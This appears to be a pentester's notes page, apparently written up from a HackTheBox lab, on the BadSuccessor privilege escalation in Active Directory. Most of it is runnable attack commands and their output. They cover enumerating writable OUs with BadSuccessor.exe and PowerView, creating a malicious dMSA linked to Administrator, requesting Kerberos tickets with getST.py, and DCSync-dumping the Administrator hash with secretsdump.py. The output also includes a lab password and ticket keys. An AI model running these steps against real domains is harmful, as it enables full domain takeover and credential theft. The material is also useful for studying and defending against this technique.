---
title: BadSuccessor - Windows Privilege Escalation
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - windows
  - privilege
  - escalation
  - tools
---

# BadSuccessor - Windows Privilege Escalation

Sources:

- https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory
- https://github.com/ibaiC/BadSuccessor


## Enumerating


```
########################################
# Check OS version (CRITICAL trigger)
########################################
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | 
Select-Object ProductName, CurrentVersion, CurrentBuild, ReleaseId
```

Look for: Windows Server 2025 + Build 26100

## Requirements

```
########################################
# Required privileges
########################################

- GenericWrite OR GenericAll on an OU
- OR CreateChild on an OU
- Domain user credentials
```


Find Writable OUs

```
.\BadSuccessor.exe find

# Example:
Evil-WinRM* PS C:\Users\adam.scott\Documents> .\BadSuccessor.exe find
 ______           __ _______
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|____|_____|_____|_____|_____|__|

Researcher: @YuG0rd
Author: @kreepsec


[*] OUs you have write access to:
    -> OU=Domain Controllers,DC=eighteen,DC=htb
       Privileges: GenericWrite, GenericAll
    -> OU=Staff,DC=eighteen,DC=htb
       Privileges: GenericWrite, GenericAll, CreateChild
```

Alternative, PowerView.ps1

```
Import-Module .\PowerView.ps1

Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs |
? { $_.IdentityReference -match "<USER>" -and $_.ActiveDirectoryRights -match "Write|CreateChild" }
```


## Attack

Exploitation Flow:

User → Writable OU → Create dMSA → Link to Administrator → Kerberos abuse → DCSync

### 🧨 Step 1 — Create Malicious dMSA

```
.\BadSuccessor.exe escalate \  
-targetOU "OU=STAFF,DC=domain,DC=local" \  
-dmsa web_svc \  
-targetUser "CN=Administrator,CN=Users,DC=domain,DC=local" \  
-dnshostname fakehost \  
-user <USER> \  
-dc-ip <DC_IP>


# Example:
Evil-WinRM* PS C:\Users\adam.scott\Documents> .\BadSuccessor.exe escalate -targetOU "OU=STAFF,DC=eighteen,DC=htb" -dmsa web_svc -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname FinancialPlanning -user adam.scott -dc-ip 127.0.0.1

 ______           __ _______
|   __ \ .---.-.--|  |     __|.--.--.----.----.-----.-----.-----.-----.----.
|   __ < |  _  |  _  |__     ||  |  |  __|  __|  -__|__ --|__ --|  _  |   _|
|______/ |___._|_____|_______||_____|____|____|_____|_____|_____|_____|__|

Researcher: @YuG0rd
Author: @kreepsec

[*] Creating dMSA object...
[*] Inheriting target user privileges
    -> msDS-ManagedAccountPrecededByLink = CN=Administrator,CN=Users,DC=eighteen,DC=htb
    -> msDS-DelegatedMSAState = 2
[+] Privileges Obtained.
[*] Setting PrincipalsAllowedToRetrieveManagedPassword
    -> msDS-GroupMSAMembership = adam.scott
[+] Setting userAccountControl attribute
[+] Setting msDS-SupportedEncryptionTypes attribute

[+] Created dMSA 'web_svc' in 'OU=STAFF,DC=eighteen,DC=htb', linked to 'CN=Administrator,CN=Users,DC=eighteen,DC=htb' (DC: 127.0.0.1)

[*] Phase 4: Use Rubeus or Kerbeus BOF to retrieve TGS and Password Hash
    -> Step 1: Find luid of krbtgt ticket
     Rubeus:      .\Rubeus.exe triage
     Kerbeus BOF: krb_triage BOF

    -> Step 2: Get TGT of Windows 2025/24H2 system with a delegated MSA setup and migration finished.
     Rubeus:      .\Rubeus.exe dump /luid:<luid> /service:krbtgt /nowrap
     Kerbeus BOF: krb_dump /luid:<luid>

    -> Step 3: Use ticket to get a TGS ( Requires Rubeus PR: https://github.com/GhostPack/Rubeus/pull/194 )
    Rubeus:      .\Rubeus.exe asktgs /ticket:TICKET_FROM_ABOVE /targetuser:web_svc$ /service:krbtgt/domain.local /dmsa /dc:<DC hostname> /opsec /nowrap

```

- dMSA `web_svc$` created
- Privileges inherited from **Administrator**


### 🎟️ Step 2 — Get Kerberos Ticket (S4U)

```
# Previously, if kdc is not reachable set ligolo to reach internal 88.
# Debug clock issues
nxc smb 240.0.0.1 -u adam.scott -p iloveyou1 --generate-krb5-file ./krb5.conf
sudo cp krb5.conf /etc/krb5.conf 
# Grab server clock
getTGT.py -debug -dc-ip 240.0.0.1 EIGHTEEN.HTB/adam.scott:'iloveyou1'
# Use it: [+] Server time (UTC):
sudo timedatectl set-timezone UTC
sudo date -s "2026-04-17 15:37:07"

########################################
# Get service ticket as dMSA
########################################

getST.py <DOMAIN>/<USER> \
-impersonate 'web_svc$' \
-self -dmsa -k -no-pass \
-dc-ip <DC_IP> 



# Example:
getST.py eighteen.htb/adam.scott -impersonate 'web_svc$' -self -dmsa -k -no-pass -dc-ip 240.0.0.1

Impacket v0.14.0.dev0+20251209.143744.82a5a8f0 - Copyright Fortra, LLC and its affiliated companies 

[*] Impersonating web_svc$
[*] Requesting S4U2self
[*] Current keys:
[*] EncryptionTypes.aes256_cts_hmac_sha1_96:6b46580b41aa9d64bbdc9363636c812dd34f73a94e50c2c9ad5e0b568dad98cb
[*] EncryptionTypes.aes128_cts_hmac_sha1_96:38e2c400617fd234da5a7dfbe6c3fab6
[*] EncryptionTypes.rc4_hmac:bb6325a75782f2f0c781863cdcc81161
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac:0b133be956bfaddf9cea56701affddec
[*] Saving ticket in web_svc$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache

```

👉 You now hold a **TGT equivalent to Administrator**

```
# Export the ticket
export KRB5CCNAME=$(pwd)/'web_svc$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache'

klist
```


### 🧬 Step 3 — DCSync (Dump Hashes)

```
########################################  
# Dump Administrator hash  
########################################  
  
secretsdump.py <DOMAIN>/web_svc\$@<DC> \  
-k -no-pass \  
-dc-ip <DC_IP> \  
-just-dc-user Administrator


# Example:
└─$ secretsdump.py EIGHTEEN.HTB/web_svc\$@dc01.eighteen.htb -k -no-pass -dc-ip 240.0.0.1 -target-ip 240.0.0.1 -just-dc-user Administrator
Impacket v0.14.0.dev0+20251209.143744.82a5a8f0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:...............................

```